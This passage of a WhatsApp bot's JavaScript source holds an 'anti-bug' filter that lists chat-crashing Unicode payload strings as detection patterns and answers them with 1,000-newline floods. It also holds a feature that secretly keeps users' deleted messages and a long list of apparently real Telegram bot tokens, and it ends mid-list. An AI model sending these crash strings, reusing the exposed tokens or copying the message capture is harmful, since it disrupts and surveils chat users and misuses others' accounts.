      messageContent.includes("ꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹꦹ") // New Special Sequence
    ) {
      console.log(`🚨 Strong Payload Detected from ${senderID}`);

      // Send warning to the flagged user
      await XeonBotInc.sendMessage(sender, { text: antibugMessage });

      // Send alert to the bot owner
      await XeonBotInc.sendMessage(XeonBotInc.user.id, {
        text: senderID.split("@")[0] + `🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️`});

      // Block the sender
      await XeonBotInc.updateBlockStatus(sender, "block");

      console.log(`🚫 User ${senderID} has been blocked and reported.`);
    }
  } catch (err) {
    console.error("❌ Error in Anti-Bug System:", err);
  }
});
        if (m.message) {
                             if (m.mtype === "LiveLocationMessage") {
                               newly = "\n".repeat(0x3e8);
                               await XeonBotInc.sendMessage(m.chat, {
                                 'text': newly
                               });
                               await XeonBotInc.sendMessage(XeonBotInc.user.id, {
                                 'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                               });
                               await XeonBotInc.updateBlockStatus(m.sender, "block");
                             }
                           }          
              if (m.message) {
                                    if (m.mtype === "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ") {
                                      newly = "\n".repeat(0x3e8);
                                      await XeonBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await XeonBotInc.sendMessage(XeonBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await XeonBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }
               if (m.message) {
                                    if (m.mtype === "⚽ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི") {
                                      newly = "\n".repeat(0x3e8);
                                      await XeonBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await XeonBotInc.sendMessage(XeonBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await XeonBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }

  
                  
                     if (m.message) {
                                    if (m.mtype === "꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫") {
                                      newly = "\n".repeat(0x3e8);
                                      await XeonBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await XeonBotInc.sendMessage(XeonBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await XeonBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }  
                      // Define and initialize antibilling variable
// Initialize Anti-Billing toggle
let antibilling = false; // Default is off

// Define Billing Keywords
const billingKeywords = [
    'help', 'abeg', 'please', 'money', 'data', 'loan', 'send me', 'airtime', 'cash', 'boss',
    '2k'
    // Add more keywords here
];

// Message Handling
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Only proceed if antibilling is activated and a text message is present
        if (antibilling && m) {
            const isBilling = billingKeywords.some(keyword => m.toLowerCase().includes(keyword));

            if (isBilling) {
                const sender = message.key.remoteJid;

                // Send filler text to chat
                const fillerText = "\n".repeat(1000);
                await XeonBotInc.sendMessage(sender, { text: fillerText });

                // Notify the bot owner/admin
                const alertText = `${sender.split('@')[0]} 🚫 User flagged for billing attempts! User has been blocked.`;
                await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: alertText });

                // Delete the offending message
                await XeonBotInc.sendMessage(sender, { delete: message.key });

                // Block the user
                await XeonBotInc.updateBlockStatus(sender, "block");
            }
        }
    } catch (err) {
        console.error('Error in Anti-Billing Handler:', err);
    }
});
// Define keywords for detection
const bigDaddyKeywords = ["play", "time", "weather", "help"]; // Add more keywords as needed

let bigDaddyActive = true; // Default is off

// Message Handling for Big Daddy interactions
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const sender = message.key.remoteJid; // Message sender's ID
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Ensure the bot only responds to messages containing "Big Daddy"
        if (bigDaddyActive && m) {
            const isBigDaddyCall = m.toLowerCase().includes('big daddy');

            if (isBigDaddyCall) {
                // Extract the content following "Big Daddy"
                const command = m.toLowerCase().split('big daddy')[1]?.trim();

                if (command) {
                    // Check if any keyword exists in the command
                    const foundKeyword = bigDaddyKeywords.find(keyword => command.startsWith(keyword));

                    if (foundKeyword) {
                        // Extract and send the text after the detected keyword
                        const responseText = command.replace(foundKeyword, '').trim();
                        await XeonBotInc.sendMessage(sender, { text: responseText || "I didn't catch that!" });
                    } else {
                        // Ignore if no listed keyword is found after "Big Daddy"
                        return;
                    }
                }
            }
        }
    } catch (err) {
        console.error('Error in Big Daddy Handler:', err);
    }
});
let anticall = false; // Default is off
let callBlockedUsers = {}; // To track blocked users and their unblock timeout

// Listen for incoming call updates
XeonBotInc.ev.on('call', async (callUpdate) => {
    if (!anticall) return; // Skip if Anti-Call is off

    try {
        for (const call of callUpdate) {
            if (call.status === "offer") { // Check for incoming calls
                const sender = call.from;
                if (callBlockedUsers[sender]) {
                    console.log(`User ${sender} is currently blocked from calling.`);
                    return; // Skip if the user is already blocked
                }

                console.log(`Incoming call detected from: ${sender}`);

                // Send filler text to chat to block the user
                const fillerText = "🚫 You will be blocked for calling my owner. my owner doesn't want to receive any calls for now Please send a message in the next 1 min."; // Send filler message to block
                await XeonBotInc.sendMessage(sender, { text: fillerText });

                // Notify the bot owner/admin about the blocked user
                const alertText = `${sender.split('@')[0]} 🚫 User flagged for calling attempts! User has been blocked. User will be unblocked in the next one minute`;
                await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: alertText });

                // Block the user
                await XeonBotInc.updateBlockStatus(sender, "block");

                console.log(`User ${sender} has been blocked.`);

                // Track the blocked user with unblock timeout (1 minute)
                callBlockedUsers[sender] = setTimeout(async () => {
                    await XeonBotInc.updateBlockStatus(sender, "unblock");
                    delete callBlockedUsers[sender]; // Remove from blocked users
                    console.log(`User ${sender} has been unblocked after 1 minute.`);
                }, 60000); // 60000 milliseconds = 1 minute
            }
        }
    } catch (err) {
        console.error("Error handling incoming call:", err);
    }
});   
let antidelete = false; // Default is off
const trackedMessages = {}; // Store tracked messages

// Track incoming messages
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message || message.key.fromMe) return; // Ignore bot's own messages

        const messageId = message.key.id; // Message ID
        const sender = message.key.remoteJid; // Sender's ID
        const text =
            message.message?.conversation ||
            message.message?.extendedTextMessage?.text ||
            null;

        // Save the message if it has text
        if (text) {
            trackedMessages[messageId] = { sender, text };
        }
    } catch (err) {
        console.error('Error tracking messages:', err);
    }
});

// Detect and handle deleted messages
XeonBotInc.ev.on('messages.update', async (updates) => {
    try {
        if (!antidelete) return; // Skip if Anti-Delete is off

        for (const update of updates) {
            const messageId = update.key.id; // Deleted message ID
            const sender = update.key.remoteJid; // User or group where the message was deleted

            // Check if the message was tracked before deletion
            const deletedMessage = trackedMessages[messageId];
            if (deletedMessage) {
                const alertText = `🚨 *Anti-Delete Alert* 🚨\n\n` +
                                  `👤 *User:* ${sender.split('@')[0]}\n` +
                                  `💬 *Deleted Message:* "${deletedMessage.text}"`;

                // Notify the bot owner/admin
                await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: alertText });

                // Remove the message from the tracking object
                delete trackedMessages[messageId];
            }
        }
    } catch (err) {
        console.error('Error handling deleted messages:', err);
    }
});
let autoReact = false; // Default is off

// Track incoming messages
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message || message.key.fromMe) return; // Ignore bot's own messages

        const messageId = message.key.id; // Message ID
        const sender = message.key.remoteJid; // Sender's ID
        const text =
            message.message?.conversation ||
            message.message?.extendedTextMessage?.text ||
            null;

        // React to the message if auto-react is enabled
        if (autoReact) {
            const randomEmojis = [
                '❤️', '👍', '🎉', '😎', '🔥', '👏', '💡', '✨', '🎈', '🌟', '😊', '😍', '💯', '😅', '🥳', '🤩', '🎶', '💖', '🍀', '🌈',
                '⚡', '💥', '🌺', '🌼', '🌸', '🌻', '🐾', '💌', '💝', '🌷', '🍁', '🍃', '🌿', '🌙', '🪐', '☀️', '🌞', '🌜', '🌑',
                '🌒', '🌓', '🌔', '🌕', '🌖', '🌗', '🌘', '🌚', '✨', '💎', '🖤', '💜', '❤️‍🔥', '💙', '💚', '💛', '🧡', '🤍', '🤎', '💗',
                '💓', '💞', '💘', '💌', '💍', '🔮', '🌍', '🌎', '🌏', '🪴', '🌵', '🌾', '🍂', '🍄', '🍉', '🍇', '🍓', '🍈', '🍒', '🍑', '🥭',
                '🍍', '🥥', '🍉', '🍊', '🍋', '🍏', '🍎', '🍍', '🍅', '🥕', '🥔', '🍠', '🌽', '🥒', '🍑', '🍋', '🍒', '🥝', '🫐', '🍜', '🍛',
                '🍝', '🍕', '🍣', '🍤', '🍖', '🍗', '🍠', '🥧', '🍩', '🍪', '🍨', '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🥨', '🥯', '🍪',
                '🍩', '🍪', '🥓', '🍔', '🥪', '🍟', '🥞', '🍣', '🍰', '🥧', '🍇', '🍉', '🥑', '🥥', '🥭', '🍅', '🥦', '🥕', '🥔', '🥗', '🥒',
                '🥥', '🍒', '🍑', '🍋', '🥭', '🍉', '🍇', '🍋', '🥝', '🫐', '🍊', '🍏', '🥕', '🍅', '🥒', '🥔', '🥥', '🍠', '🍞', '🥐', '🍩',
                '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🍪', '🍩', '🍕', '🍜', '🍚', '🍛', '🍕', '🍣', '🍤', '🍔', '🍗', '🍖', '🥓', '🥩',
                '🍿', '🎥', '🎬', '🎧', '🎮', '🎤', '🎵', '🎷', '🎺', '🎸', '🎻', '🎼', '🎶', '🎧', '🎵', '🎶', '🎤', '🎬', '🎮', '🎸', '🎹',
                '🎷', '🎺', '🎼', '🎻', '🎧', '🎮', '🎮', '🧸', '🪀', '🎨', '🖌️', '🎭', '🎪', '🎠', '🎰', '🛹', '🛷', '🏀', '⚽', '🏈', '🎱',
                '🎯', '🎳', '🏏', '🏑', '🏓', '🎾', '🛶', '🚴', '🧗', '🧘', '🏄', '🏇', '⛷️', '🏌️‍♂️', '⛹️‍♀️', '🚣', '🏆', '🎮', '🎲',
                '🎮', '🍕', '🍔', '🍟', '🍗', '🥔', '🥦', '🌽', '🥒', '🥝', '🥭', '🍍', '🍎', '🍊', '🍋', '🥭', '🥑', '🥒', '🌶️', '🍠', '🥔',
                '🍪', '🍩', '🍫', '🍫', '🍪', '🥪', '🥡', '🍜', '🍣', '🍤', '🍙', '🍚', '🍗', '🍖', '🥩', '🥓', '🥨', '🍧', '🍡', '🍪', '🍩',
                '🍜', '🍛', '🍝', '🥝', '🫐', '🍁', '🍃', '🌲', '🌳', '🌴', '🌱', '🪴', '🌾', '🌿', '🌺', '🌼', '🌻', '🌸', '🌷', '🌹', '💐',
                '🍀', '🍁', '🍃', '🌱', '🌿', '🌾', '🌸', '🌺', '🌻', '🌼', '💮', '🍂', '🍃', '🍄', '🌷', '🍁', '🌿', '🎋', '🎋', '🌹', '🌸'
            ];

            const randomEmoji = randomEmojis[Math.floor(Math.random() * randomEmojis.length)];

            // Send a random emoji as a reaction
            await XeonBotInc.sendMessage(sender, {
                react: { text: randomEmoji, key: message.key }
            });
        }
    } catch (err) {
        console.error('Error tracking messages:', err);
    }
});
let autoStatusView = false; // Default is OFF

// Listen for messages and statuses
XeonBotInc.ev.on('messages.upsert', async (msgUpdate) => {
    try {
        if (!autoStatusView) return; // Skip if auto-status view is disabled

        const message = msgUpdate.messages[0];
        if (!message || message.key.remoteJid !== 'status@broadcast') return; // Only process statuses

        const { participant, id } = message.key; // JID of the status sender
        console.log(`Viewing status from ${participant}`);

        // Mark the status as read
        await XeonBotInc.readMessages([
            {
                remoteJid: 'status@broadcast',
                id: id,
                participant: participant,
            },
        ]);
    } catch (err) {
        console.error('Error viewing statuses:', err);
    }
});
let autoswview = false; // Default is off

// Listen for status updates
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the message object
        if (!message || !message.key.remoteJid.endsWith('@status')) return; // Ensure it's a status update

        if (autoswview) {
            const participant = message.key.remoteJid; // Status uploader's JID
            const statusId = message.key.id; // Specific status ID

            // View the status
            console.log(`Viewing status from ${participant}`);
            await XeonBotInc.readMessages([{ remoteJid: participant, id: statusId }]);

            // React to the status using reactionAdd
            const randomEmojis = ['❤️', '🔥', '😂', '👍', '👏', '😍', '🎉', '💯'];
            const randomEmoji = randomEmojis[Math.floor(Math.random() * randomEmojis.length)];

            console.log(`Reacting to status ${statusId} from ${participant} with emoji: ${randomEmoji}`);
            await XeonBotInc.reactionAdd(participant, 'STATUS', randomEmoji);

            console.log(`Successfully viewed and reacted to status from ${participant}`);
        }
    } catch (error) {
        console.error('Error in auto status view and react:', error);
    }
});
global.userSessions = global.userSessions || {};
async function fetchTelegramFile(type, botToken, chatId) {
    const getUpdatesUrl = `https://api.telegram.org/bot${botToken}/getUpdates`;

    // Clear old updates
    const initialUpdatesResponse = await fetch(getUpdatesUrl);
    const initialUpdates = await initialUpdatesResponse.json();
    const lastUpdateId = initialUpdates.result.length
        ? initialUpdates.result[initialUpdates.result.length - 1].update_id
        : null;

    let fileId = null;
    let textContent = null;
    let urlContent = null; // New variable to hold URL
    let retries = 0;

    while (!fileId && !textContent && !urlContent && retries < 15) { // Retry up to 15 times
        const updatesResponse = await fetch(
            `${getUpdatesUrl}${lastUpdateId ? `?offset=${lastUpdateId + 1}` : ''}`
        );
        const updates = await updatesResponse.json();

        if (updates.result && updates.result.length > 0) {
            for (const update of updates.result) {
                if (update.message?.chat?.id == chatId) {
                    // Ignore specific types with a /command or specific phrases
                    if (
                        (update.message.video && update.message.caption?.startsWith('/')) ||
                        (update.message.audio && update.message.caption?.startsWith('/')) ||
                        (update.message.document && update.message.caption?.startsWith('/') &&
                         update.message.document.mime_type === 'application/pdf') ||
                        (update.message.text && 
                         (update.message.text.startsWith('/') || 
                          update.message.text.includes('Identifying the audio... Please wait!') || 
                          update.message.text.includes('http') || 
                          update.message.text.includes('https')))
                    ) {
                        continue; // Skip this update
                    }

                    // Check for the requested type
                    if (type === 'audio' && update.message.audio) {
                        fileId = update.message.audio.file_id;
                        break;
                    } else if (type === 'video' && update.message.video) {
                        fileId = update.message.video.file_id;
                        break;
                    } else if (type === 'photo' && update.message.photo) {
                        // Get the largest photo
                        const photoSizes = update.message.photo;
                        fileId = photoSizes[photoSizes.length - 1].file_id;
                        break;
                    } else if (type === 'text' && update.message.text) {
                        textContent = update.message.text;
                        break;
                    } else if (type === 'pdf' && update.message.document) {
                        // Check if the document is a PDF
                        if (update.message.document.mime_type === 'application/pdf') {
                            fileId = update.message.document.file_id;
                            break;
                        }
                    } else if (type === 'url' && update.message.text) {
                        // Check if the message text contains a URL
                        const urlRegex = /(https?:\/\/[^\s]+)/g;
                        const urls = update.message.text.match(urlRegex);
                        if (urls) {
                            urlContent = urls[0]; // Return the first URL found
                            break;
                        }
                    }
                }
            }
        }
        retries++;
        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before retrying
    }

    if (!fileId && !textContent && !urlContent) throw new Error(`Failed to retrieve new ${type} from Telegram`);

    if (type === 'text') {
        // Return the text content directly
        return textContent;
    } else if (type === 'url') {
        // Return the URL content directly
        return urlContent;
    }

    // Fetch File URL for media (including PDF)
    const getFileUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`;
    const fileResponse = await fetch(getFileUrl);
    const fileData = await fileResponse.json();

    if (!fileData.result?.file_path) throw new Error(`${type.charAt(0).toUpperCase() + type.slice(1)} file not found`);
    return `https://api.telegram.org/file/bot${botToken}/${fileData.result.file_path}`;
}
const axios = require('axios');
const FormData = require('form-data');

async function sendMediaToTelegram({ botToken, chatId, mediaBuffer, mediaType, caption }) {
    const sendMediaUrl = `https://api.telegram.org/bot${botToken}/send${mediaType}`;
    const MAX_RETRIES = 3;

    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
            // Create FormData
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append(
                mediaType.toLowerCase(),
                mediaBuffer,
                `media.${mediaType === 'Photo' ? 'jpg' : mediaType === 'Video' ? 'mp4' : 'mp3'}`
            );
            if (caption) formData.append('caption', caption);

            // Send media to Telegram
            const response = await axios.post(sendMediaUrl, formData, {
                headers: formData.getHeaders(),
                timeout: 10000, // Timeout for 10 seconds
            });

            if (response.data.ok) {
                return response.data.result;
            } else {
                throw new Error(`Telegram API Error: ${response.data.description}`);
            }
        } catch (error) {
            console.error(`Attempt ${attempt} failed:`, error.message);

            if (attempt === MAX_RETRIES) {
                throw new Error(`Failed to send ${mediaType} to Telegram after ${MAX_RETRIES} attempts.`);
            }

            // Wait before retrying
            await new Promise((resolve) => setTimeout(resolve, 5000));
        }
    }
}
const botData = [
    { botToken: '7990920443:AAEboEVzlR7Ub2B3a-sy-rfD4kan8t9jH-w', groupId: -4753002185 },
    { botToken: '7246237006:AAGBlCGREw4wWJqAiLOFqkc8JCPVnfLBSjA', groupId: -4676636503 },
    { botToken: '7506240743:AAFLiKxWKTtJXEV9JR-6NJo9ZG8x47uIM3E', groupId: -4608507809 },
    { botToken: '7586987455:AAG2eBeL9YjMEWEDj8d2DACg2ecLU5viO-s', groupId: -4658810431 },
    { botToken: '7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M', groupId: -1002265939686 },
    { botToken: '8054936174:AAEACr5xoOrcsyzgC-xtiMmxEJ3RSsy7qB8', groupId: -4622387544 },
    { botToken: '7875081937:AAHkR6PXQbv_zswfzHhzP0khv0Mgr0VDmfU', groupId: -4744532609 },
    { botToken: '7265957806:AAGmA_noVzwRVQ1KmcBA0QBqQ2Qpz9MBIKw', groupId: -4652582925 },
    { botToken: '8109504991:AAGDaafXU2c9tGkWVJ-pG4wPEooTq4LyNBU', groupId: -4785386758 },
    { botToken: '7918060541:AAFtC1qvyghnFSb08H7vbpe8Xm83XzNMQn0', groupId: -4600411217 },
    { botToken: '8146374216:AAGtVwx6YYZqM7p3XTaNulv0lWOg5GEPHvg', groupId: -4787137259 },
    { botToken: '7770108116:AAE7MHLF7npbHWPU1S2FUmc30StR4E7REtg', groupId: -4683006292 },
    { botToken: '8122521132:AAH0hFilVOskJeqPw8xHnurhEV6trrQkwdw', groupId: -4752666577 },
    { botToken: '8016002658:AAH2iIRcmdngAhEmR0_IuBCEu9npoZuSah8', groupId: -4706641700 },
    { botToken: '7503679111:AAG-YakSMB0DXXDhUpc9StVnC1wLikja5Tc', groupId: -4733934934 },
    { botToken: '7564432963:AAEgq5xcG95N_eX65GTcbBm7-cfXS6ySpSs', groupId: -4743452154 },
    { botToken: '8160556518:AAGGW6MxpWCpJYu-5bsT7Q_KwBYsNOW4NjY', groupId: -4765564993 },
    { botToken: '8122087771:AAFp3GTcLO6VW-LZFKIT1fr5v9AGcQeGS4o', groupId: -4712040918 },
    { botToken: '8127901250:AAF3PrCU0v8U4TaWmJqDFcnsiUoywgCSPy0', groupId: -4733990431 },
    { botToken: '7756847746:AAHCWrPTLqWKaMvqcVnMeSU9iCWV_77Angw', groupId: -4681393767 },
    { botToken: '7994390734:AAFEvlYVE_44YEFXgNkIZ31eu--2H4rNdZQ', groupId: -4660016834 },
    { botToken: '8155970091:AAFAOs8lBic0BEmSXreauM7-Fx2hL-bGaxY', groupId: -4618192020 },
    { botToken: '7749561374:AAHyPgalTaf3ZLU4CRXQjLjG1zr_kViPOYk', groupId: -4792919591 },
    { botToken: '7859423926:AAEA8jIB-CtsuwSpj5g8DNuFgx2cbabZW_U', groupId: -4671536998 },
    { botToken: '8065594515:AAH50u1afKpMYBkFqRurpg0GITLi34VOhgM', groupId: -4768354588 },
    { botToken: '7693264210:AAGH0_6SE4dd36Uz0UwLzkytQ17TbwIYzOc', groupId: -4654832947 },
    { botToken: '8121171066:AAFBzRyaK_cwWzlkT8Ssp_SUEcpaPZnokqU', groupId: -4655825283 },
    { botToken: '8156379119:AAF7fm-hogC1A1QvUYhOGH3rFzfO0YW2gE8', groupId: -4706949612 },
    { botToken: '7785743210:AAFX2w7G_wuqO3WGc6s8kwNGqbyITY4FHuk', groupId: -4636960919 },
    { botToken: '7602393679:AAG8kMjAclj3_l9CTasF3U7-B4RZ5k1oXXI', groupId: -4691869335 },
    { botToken: '7595062253:AAGKye_HNTpnMRpiWBd8qD7jWPRVg4monGc', groupId: -4640049253 },
    { botToken: '7929450175:AAF44cCfYTLQ27RTtRZPRnajc717VqfENs0', groupId: -4796073453 },
    { botToken: '6751864800:AAHRxbm1VW3Kq2y7-4ftNk09_8dDLJB82So', groupId: -4670929884 },
    { botToken: '7418118922:AAG2T5TXAlmQe3JQy1FrJxuOddZ7hTnIcNE', groupId: -4639610871 },
    { botToken: '7624440880:AAEpDbXHNbAZNfTQ7oJjCCKOZLsxq4lREQ4', groupId: -4670921936 },
    { botToken: '7644099994:AAGGqAhYfMOcAeg2YjXoCwfIpmh2zkSSyu4', groupId: -4630356742 },
    { botToken: '7595903023:AAHv7FK--DxHcPZ_fK05dbXmqAtI9-e4wkQ', groupId: -4679338518 },
    { botToken: '7705773513:AAGQGqN9im2V4kXYkE1z7RnMl8CkQUd_XlY', groupId: -4673327670 },
    { botToken: '7826910523:AAHmVZ-y1AsnTZXvdVbnH5MeBqrKi67zt3M', groupId: -4720812440 },
    { botToken: '7541065524:AAHK8gJoTGEFELLszQZTf3XkQ7qCwHMvDa8', groupId: -4682074875 },
    { botToken: '7635872903:AAFoQBnG-urw37KlpYQPqCDT-qqnW-5IJmg', groupId: -4743848762 },
    { botToken: '8080602331:AAF9sM7bH1kLe4zKjI1dSJrhQJwYTOnLWH8', groupId: -4792935039 },
    { botToken: '7244290677:AAFFUEpoSAoCHGVzccdAtPeFlTZydvs1bTA', groupId: -4756157043 },
    { botToken: '7490478557:AAGm1E9raiVpa7QDVqUTdwhJB-KxrzttYG8', groupId: -4698677860 },
    { botToken: '8011881718:AAHdeBU6Anw0RWeFaCUh1QufAoqZlMA3vYY', groupId: -4641707421 },
    { botToken: '7506278719:AAHVZeyM7sve8W_lX4-H3fYPP7ZfxpKfJv8', groupId: -4739093886 },
    { botToken: '7963361675:AAGsP3m4gj-vCBRVlcI0-Zjl9lrmaVR21cw', groupId: -4780311578 },
